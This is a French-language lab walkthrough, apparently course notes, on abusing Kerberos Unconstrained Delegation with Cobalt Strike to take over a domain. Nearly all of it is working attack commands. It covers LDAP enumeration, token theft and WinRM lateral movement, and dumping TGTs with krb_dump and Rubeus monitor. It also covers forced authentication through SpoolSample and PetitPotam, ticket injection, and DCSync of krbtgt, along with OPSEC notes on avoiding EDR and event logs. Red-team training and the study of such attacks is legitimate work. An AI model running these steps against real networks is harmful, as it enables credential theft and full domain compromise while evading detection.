# Lab — Unconstrained Delegation Kerberos  

> L’objectif de ce lab est d’exploiter l’**Unconstrained Delegation** afin d’obtenir le TGT d’un Domain Admin.  

> L’Unconstrained Delegation permet à un service ou ordinateur d’effectuer une impersonation d’un utilisateur auprès de différents services du domaine.  
> Lorsqu’un utilisateur s’authentifie auprès d’un hôte ayant l’Unconstrained Delegation activée,  
> son TGT peut être transmis et mis en cache dans LSASS sur cet hôte.  
> Une personne contrôlant cet hôte peut récupérer ces TGT et les réutiliser,   
> notamment pour effectuer une impersonation d’utilisateurs qui s’y sont authentifiés, y compris des Domain Admins.  
> L’Unconstrained Delegation fait partie des formes de delegation les plus permissives et risquées,  
> car elle ne limite pas de la même manière les services auxquels le ticket peut être transféré.  

## Énumération

1. Lancer Cobalt Strike et se connecter au team server.
2. Utiliser LDAP pour identifier les ordinateurs configurés avec Unconstrained Delegation.

    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
    ```

> `OPSEC-🟢SAFE` — `ldapsearch` s’exécute comme un BOF (inline, sans child process ni écriture sur disque).

⚠️ Les Domain Controllers utilisent également Unconstrained Delegation et ne constituent pas la cible de ce lab. Une autre machine, `lon-ws-1$`, doit apparaître.

1. Effectuer une impersonation de `rsteel`, puis un Lateral Movement vers `lon-ws-1`.

> **Pourquoi lon-ws-1 ?** Cet hôte dispose d’Unconstrained Delegation.  
> Un Beacon **sur cet hôte** est nécessaire pour récupérer les TGT des utilisateurs qui s’y authentifient.

**Option A — steal_token (si un processus rsteel tourne sur l’hôte actuel)** `OPSEC-🟢SAFE`

```cs
beacon> ps                              // find a process owned by rsteel
beacon> steal_token <pid>              // duplicate token in-process, no spawn, no Event 4648
beacon> spawnto x64 %windir%\sysnative\werfault.exe
beacon> powerpick Test-WSMan lon-ws-1  // verify WinRM reachable
beacon> jump winrm64 lon-ws-1 smb     // inject into wsmprovhost.exe — no service, no Event 7045
beacon> rev2self                       // drop token on original beacon after jump succeeds
```

**Option B — Injection de TGT (si le TGT rsteel est en cache sur cet hôte)** `OPSEC-🟢SAFE` dump / `OPSEC-🟠CAUTION` make_token

```cs
// Step 1 — confirm rsteel TGT is cached and dump it
beacon> krb_triage
beacon> krb_dump /user:rsteel /service:krbtgt  // copy the base64 blob from output
```

```powershell
# Step 2 — Attacker Windows box PowerShell (NOT in beacon — path is on CS client machine)
# Paste the full base64 blob from krb_dump as a single unbroken string
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<base64 from krb_dump>"))
```

```cs
// Step 3 — make_token MUST come before kerberos_ticket_use
// Beacon running as SYSTEM has no Kerberos user logon session — ticket injection fails with
// "Failed to use ticket: 0" unless a user logon session exists first.
// kerberos_ticket_use injects the TGT into the Type 9 session created by make_token.
beacon> make_token CONTOSO\rsteel FakePass     // OPSEC-🟠CAUTION — Event 4648 logged
                                               // password is irrelevant — ticket overrides cred

// Step 4 — kerberos_ticket_use requires a .kirbi FILE PATH — inline base64 is NOT supported
// CS treats bare base64 as a filename and returns "does not exist" error
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

// Step 5 — lateral move using rsteel's Kerberos context
beacon> jump winrm64 lon-ws-1 smb
beacon> rev2self
```

> Vérifier que le Beacon est bien présent sur `lon-ws-1` avant de poursuivre :
> ```cs
> beacon> getuid
> beacon> pwd
> ```
> Obtenir SYSTEM sur `lon-ws-1` si nécessaire : `krb_dump` requiert ce contexte pour accéder aux tickets d’autres utilisateurs.

===

## Exploitation

Deux méthodes selon qu’un TGT privilégié est déjà en cache ou qu’une authentification doit être déclenchée.

---

### Stratégie A — Récupérer les TGT déjà en cache (BOF)

À utiliser lorsque l’utilisateur ciblé s’est déjà authentifié auprès de l’hôte en Unconstrained Delegation.

Depuis le nouveau Beacon de `lon-ws-1` :

1. Énumérer les tickets avec un BOF, sans création de processus.

    ```Beacon-nocolor
    krb_triage
    ```

    > `OPSEC-🟢SAFE` — Le BOF s’exécute dans le thread Beacon via `inline-execute`, sans child process.

⚠️ Le compte `dyork@CONTOSO.COM` doit apparaître dans les résultats.

2. Vérifier que `dyork` est Domain Admin.

    ```Beacon-nocolor
    ldapsearch samAccountName=dyork --attributes memberOf
    ```

3. Récupérer le TGT avec un BOF utilisant l’API Kerberos `LsaCallAuthenticationPackage`, sans lecture directe de la mémoire LSASS.

    ```Beacon-nocolor
    krb_dump /user:dyork /service:krbtgt
    ```

    > `OPSEC-🟠CAUTION` — L’opération utilise l’API Kerberos (`LsaCallAuthenticationPackage` / `KerbRetrieveEncodedTicketMessage`). LSASS reste impliqué et un EDR peut observer cet appel.

4. Utiliser le TGT pour effectuer une impersonation de `dyork` et vérifier l’accès Domain Admin à `lon-dc-1`.

> Le TGT Base64 de `dyork` figure dans la sortie du Beacon de l’étape 3. Il **n’a pas besoin d’être écrit sur disque**.

```powershell
# Attacker Windows box PowerShell — convert krb_dump base64 output to .kirbi file
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi", [Convert]::FromBase64String("<base64 from krb_dump>"))
```

```cs
// Create a sacrificial logon session to inject into — password is irrelevant
beacon> make_token CONTOSO\dyork FakePass        // OPSEC-🟠CAUTION — Event 4648 logged
                                                 // Type 9 logon (network only) — no interactive session created

// kerberos_ticket_use requires a .kirbi FILE PATH — inline base64 not supported in this CS version
// CS treats bare base64 as a filename and returns "does not exist" error
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi  // OPSEC-🟢SAFE — reads file from CS client, injects in-memory

// Confirm ticket loaded
beacon> run klist                                // OPSEC-🟠CAUTION — spawns klist.exe child process
                                                 // Alternative: krb_triage (BOF — no spawn) OPSEC-🟢SAFE

// Verify DA access — list DC C$ share
beacon> ls \\lon-dc-1\c$                        // OPSEC-🟢SAFE — built-in beacon command, no child process
                                                 // Generates CIFS service ticket request (TGS-REQ to DC)
                                                 // and Event 5140 (network share access) on lon-dc-1

// From here: DCSync, dump further credentials, or move laterally as dyork
beacon> dcsync contoso.com CONTOSO\krbtgt        // OPSEC-🟠CAUTION — Event 4662 replication event on DC
beacon> dcsync contoso.com CONTOSO\Administrator

// Clean up impersonation when done
beacon> rev2self                                 // OPSEC-🟢SAFE — drops token, restores beacon identity
```

> **Si `ls \\lon-dc-1\c$` renvoie Access Denied**, vérifier l’injection ou l’expiration du TGT et consulter `EndTime` dans la sortie de `krb_dump`. Les notes mentionnent une durée de validité habituelle de 10 heures.

---

### Stratégie B — Forcer une authentification via Printer Bug (SpoolSample)

À envisager lorsqu’aucun TGT privilégié n’est en cache : le scénario déclenche une authentification depuis un DC ou une workstation administrateur vers l’hôte contrôlé.  
Le lab associe cette authentification forcée à `Rubeus monitor` pour récupérer le ticket via SSPI avant sa mise en cache LSASS.

#### Étape 1 — Démarrer Rubeus monitor sur l’hôte Unconstrained Delegation

Depuis le Beacon SYSTEM sur `lon-ws-1`, lancer Rubeus monitor dans un job :

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus.exe monitor /interval:5 /nowrap /filteruser:lon-dc-1$
```

> `OPSEC-🟠CAUTION` — `execute-assembly` utilise fork & run avec le processus temporaire défini par `spawnto`. La capture utilise SSPI/Kerberos, sans lecture directe de la mémoire LSASS.

⚠️ `/filteruser` limite la sortie au TGT du compte ordinateur ciblé.

#### Étape 2 — Déclencher une authentification depuis un Beacon du domaine

**Option 1 — MS-RPRN (SpoolSample / PrinterBug) :**

```Beacon-nocolor
execute-assembly C:\Tools\SpoolSample\SpoolSample.exe lon-dc-1 lon-ws-1
```

> `OPSEC-🟠CAUTION` — Réalise un appel RPC authentifié vers Print Spooler (`MS-RPRN`) sur le DC. Le lab mentionne un Event 4648. Le service Print Spooler doit être actif.

**Option 2 — MS-EFSR (PetitPotam) :**

```Beacon-nocolor
execute-assembly C:\Tools\PetitPotam\PetitPotam.exe lon-ws-1 lon-dc-1
```

> `OPSEC-🟠CAUTION` — Utilise EfsRpc (`MS-EFSR`) pour déclencher une authentification du DC, sans Print Spooler. Les notes évoquent des Events 5145/NTLM et des restrictions possibles après correctifs.

#### Étape 3 — Récupérer et importer le TGT

La sortie de Rubeus monitor affiche le TGT Base64 de `lon-dc-1$`.

Injecter le TGT obtenu dans une session de logon temporaire, sans écriture sur disque :

```Beacon-nocolor
make_token CONTOSO\FakeUser FakePass
kerberos_ticket_use <base64-ticket-from-rubeus-monitor>
```

> `OPSEC-🟢SAFE` — `kerberos_ticket_use` injecte le ticket dans le contexte token du Beacon en mémoire, sans écriture disque ni child process.

#### Étape 4 — DCSync avec le TGT du compte machine DC

Une fois le TGT `DC$` injecté, le scénario utilise DCSync pour récupérer le hash `krbtgt` :

```Beacon-nocolor
dcsync CONTOSO\krbtgt
```

> `OPSEC-🟠CAUTION` — DCSync peut générer l’Event 4662 sur le DC. Defender for Identity / MDI peut signaler les requêtes de réplication venant de comptes non-DC.

---

### Comparaison OPSEC des méthodes de récupération du TGT

| Méthode | Accès LSASS | Processus créé | Écriture disque | Niveau de bruit |
|--------|-------------|---------------|------------|-------------|
| `krb_dump` BOF | API (LsaCallAuthenticationPackage) | Non (BOF) | Non | OPSEC-🟠CAUTION |
| `Rubeus dump` | API (SSPI) | Oui (fork & run) | Non | OPSEC-🟠CAUTION |
| `Rubeus monitor` + coercion | Aucun | Oui (fork & run) | Non | OPSEC-🟠CAUTION (coercion generates auth events) |
| `mimikatz sekurlsa` | Lecture directe | Oui | Non | OPSEC-🔴UNSAFE |

**Recommandation figurant dans les notes :** privilégier `Rubeus monitor` lorsque le moment de l’authentification est contrôlable, ou `krb_dump` si le TGT est déjà en cache. L’accès direct par `mimikatz sekurlsa` est déconseillé pour l’OPSEC.

---

⚠️ Ce lab présente la récupération d’un TGT par **Unconstrained Delegation**, soit depuis un cache existant (BOF), soit après un déclenchement d’authentification (SpoolSample / PetitPotam + Rubeus monitor).
